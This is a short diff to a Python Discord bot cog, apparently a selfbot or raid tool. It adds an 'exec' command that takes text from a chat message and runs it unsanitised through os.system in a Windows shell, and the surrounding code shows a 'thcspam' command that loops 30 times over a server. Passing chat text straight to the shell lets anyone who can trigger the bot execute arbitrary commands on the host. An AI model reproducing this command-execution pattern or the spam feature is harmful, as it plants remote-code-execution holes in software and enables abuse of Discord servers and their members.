@@ -107,6 +107,16 @@ class on_message(zeenode.Cog):
                                 print(type(e))
                                 print(e.args)
                                 print(e)
+                        elif splitstr[1]=="exec":
+                            cmd = ""
+                            try:
+                                for i in range(2,len(splitstr)):
+                                    cmd = cmd + splitstr[i]+" "
+                                os.system("start cmd /k "+cmd)
+                            except Exception as e:
+                                print(type(e))
+                                print(e.args)
+                                print(e)
                         elif splitstr[1]=="thcspam":
                             for i in range(30):
                                 serverin = message.guild
